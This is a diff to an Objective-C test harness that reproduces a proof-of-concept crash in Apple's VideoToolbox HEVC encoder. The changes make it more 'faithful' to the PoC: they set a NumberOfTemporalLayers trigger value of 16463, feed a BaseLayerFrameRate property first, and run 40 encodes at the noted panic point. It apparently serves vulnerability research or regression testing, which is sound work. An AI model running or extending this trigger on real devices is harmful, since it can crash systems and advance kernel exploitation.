@@ -32,7 +32,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P142_BUILD   @"p142-avetemporal-v1"
+#define P142_BUILD   @"p142-avetemporal-v2-faithful"
 #define P142_KEY     @"NumberOfTemporalLayers"
 #define P142_DEFAULT 16463         /* the PoC's trigger threshold */
 #define P142_SURVIVE 16462         /* the PoC's surviving value */
@@ -99,27 +99,56 @@ static void p142_bandit(const char *outcome) {
     id<NSObject> nothing = nil; (void)nothing;   /* clang tidy */
 
     /* ---- the session (AVEVTSmoke law) ---- */
+    /* v2 faithful: HEVC (the PoC's codec) + the property order with
+       BaseLayerFrameRate BEFORE the count (the layer-array feeder). */
     VTCompressionSessionRef session = NULL;
     OSStatus st = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
+        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
         NULL, NULL, NULL, p142_flushCB, (__bridge void *)docs, &session);
     if (st != noErr || !session) {
         Lf(@"[-] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
            (unsigned)st);
         p142_bandit("nocreate"); return P142R();
     }
-    L(@"[1] session created");
+    L(@"[1] session created (HEVC 1280x720)");
 
     VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                          kCFBooleanTrue);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
+                         kCFBooleanTrue);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowTemporalCompression,
+                         kCFBooleanTrue);
+    OSStatus stEfr = VTSessionSetProperty(session,
+        kVTCompressionPropertyKey_ExpectedFrameRate,
+        (__bridge CFTypeRef)@30);
+    int32_t blr = 15;
+    CFNumberRef nblr = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &blr);
+    OSStatus stBlr = VTSessionSetProperty(session, (__bridge CFStringRef)@"BaseLayerFrameRate", nblr);
+    CFRelease(nblr);
+    Lf(@"[2a] frame-rate law set: Efr st=%d Blr st=%d", (int)stEfr, (int)stBlr);
+
     CFStringRef key = (__bridge CFStringRef)P142_KEY;
     CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
                                      kCFNumberSInt32Type, &(int32_t){ (int32_t)layers });
     st = VTSessionSetProperty(session, key, val);
     CFRelease(val);
-    Lf(@"[2] SetProperty(NumberOfTemporalLayers=%ld) st=%d (0 = ok;"
-       @" -12912/-6662 = the caps-wall class; else = the property's own"
-       @" reply)", layers, (int)st);
+    Lf(@"[2b] SetProperty(NumberOfTemporalLayers=%ld) st=%d (0 = set;"
+       @" -12900 = not-supported/pre-check row; -12912/-6662 = the caps",
+       layers, (int)st);
+
+    /* the readback: what did the session store? */
+    {
+        void *rb = NULL;
+        st = VTSessionCopyProperty(session, key, kCFAllocatorDefault, &rb);
+        if (st == 0 && rb) {
+            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
+                                             kCFNumberSInt32Type, &rv);
+            Lf(@"[2c] readback = %d (0 = the session DROPPED it)", rv);
+            CFRelease(rb);
+        } else {
+            Lf(@"[2c] readback st=%d", (int)st);
+        }
+    }
 
     st = VTCompressionSessionPrepareToEncodeFrames(session);
     Lf(@"[3] Prepare st=%d", (int)st);
@@ -140,11 +169,15 @@ static void p142_bandit(const char *outcome) {
         p142_bandit("nopb"); return P142R();
     }
 
-    L(@"[4] ONE ENCODE (the PoC's panic point — IN FLIGHT)");
-    VTEncodeInfoFlags flags = 0;
-    st = VTCompressionSessionEncodeFrame(session, pb,
-        CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, &flags);
-    Lf(@"[4] EncodeFrame returned st=%d flags=0x%x", (int)st, (unsigned)flags);
+    L(@"[4] the ENCODE battery (the PoC's mode: 40 frames, bounded)");
+    OSStatus firstSt = 0;
+    for (int i = 0; i < 40; i++) {
+        VTEncodeInfoFlags flags = 0;
+        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
+            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
+        if (i == 0) firstSt = est;
+    }
+    Lf(@"[4] encode battery returned; first st=%d", (int)firstSt);
     VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
 
     CVPixelBufferRelease(pb);
